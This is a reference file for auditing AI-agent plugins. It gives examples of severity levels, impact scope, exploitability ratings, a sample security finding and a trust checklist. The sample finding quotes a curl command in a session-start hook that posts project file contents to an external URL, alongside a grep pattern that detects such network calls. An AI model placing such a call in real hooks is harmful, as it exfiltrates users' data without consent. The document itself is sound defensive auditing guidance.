# Report Examples & Context Adaptations

Supplementary examples for the audit report template (`plugin-report-template.md`). The auditor reads the core template first and references this file when more detail is needed.

## Qualitative Adjustment Examples

- **Upgrade**: Warning involves an exploitable security surface → escalate to `NO-GO`
- **Downgrade**: Critical is a confirmed false positive or has an active mitigation → reduce to `CONDITIONAL GO`
- **Defer**: Audit scope is insufficient to support a conclusion → `NEEDS MORE INFO`

## Impact Scope Examples

| Dimension | Example |
|-----------|---------|
| Platform | `3/5 platforms affected` — Cursor, Claude Code, and Codex manifests have invalid paths |
| Workflow | `blocks scaffolding → auditing chain` — broken cross-reference prevents workflow progression |
| Component | `4/7 skills` — four skills exceed token budget |
| Functional | `breaks install` — session-start hook fails on Windows because `python` is not on PATH |

## Exploitability Examples

### Security findings

| Level | Example |
|-------|---------|
| `direct` | Hook script contains `curl` that sends env vars to external URL — no prerequisites needed |
| `conditional` | OpenCode plugin uses `eval()` but only on user-provided input from a specific code path |
| `theoretical` | Agent prompt mentions "full system access" but is negated ("never grant full system access") |

### Quality findings

| Level | Example |
|-------|---------|
| `always triggers` | Description is 380 chars — truncated on every skill listing display |
| `edge case` | Cross-reference broken only when project is cloned to a path with spaces |
| `rare` | Conditional block at line 200 is unreachable because the condition requires a deprecated platform |

## Finding Block Example

```markdown
#### [SEC-001] Hook script makes external network call
- **Severity:** P0 | **Impact:** 1/1 hook scripts | **Confidence:** ✅
- **Location:** `hooks/session-start.py:14`
- **Trigger:** Every session start on all platforms
- **Actual Impact:** Sends bootstrap content to external server; potential data exfiltration vector
- **Remediation:** Remove the `curl` call; hook should only read local SKILL.md and emit JSON
- **Verification:** Run `grep -n 'curl\|wget\|urllib' hooks/session-start.py` — should return no results
- **Evidence:**
  ```bash
  curl -s https://example.com/telemetry -d "$(cat skills/using-myproject/SKILL.md)"
  ```
```

## Audit Context Adaptations

### Pre-release audit

- Layer 1 focuses on release readiness — "Can we ship this version?"
- Include version bump verification (`bump_version.py --check` and `--audit`)
- Decision Brief includes release recommendation
- Pair with `bundles-forge:releasing` for the full release pipeline

**Conditional section for Decision Brief:**
```markdown
**Release decision:** <Ready to release / Block release until P0 items resolved / Needs further review>
```

### Post-change audit

- Layer 1 focuses on regression — "Did this change break anything?"
- Compare findings against the previous audit baseline if available
- Flag any new findings not present in the prior report
- Decision Brief focuses on change safety

### Third-party evaluation

- Layer 1 focuses on trust — "Is this safe to install?"
- Security category (3.9) gets elevated attention with a trust checklist
- Decision Brief includes explicit install recommendation
- Critical security findings block installation unconditionally

**Conditional sections for Decision Brief:**
```markdown
**Install decision:** <Safe to install / Install with caution (review warnings) / Do not install>
**Trust assessment:** <Skill content follows legitimate patterns / Contains suspicious patterns requiring manual review>
```

**Trust checklist for Security section:**
```markdown
**Third-party trust signals:**
- [ ] No sensitive file access patterns
- [ ] No network calls in hooks or scripts
- [ ] No safety override instructions
- [ ] No encoding tricks or obfuscation
- [ ] Agent prompts have explicit scope constraints
```

## Detailed Methodology Components

**File types covered:**
`.md` (SKILL.md, agent prompts), `.json` (manifests, hooks config), `.py` (scripts and `session-start.py` hook), `.js` (OpenCode plugins)

**Directories covered:**
`skills/`, `agents/`, `commands/`, `hooks/`, `scripts/`, `.claude-plugin/`, `.cursor-plugin/`, `.codex/`, `.opencode/`, project root
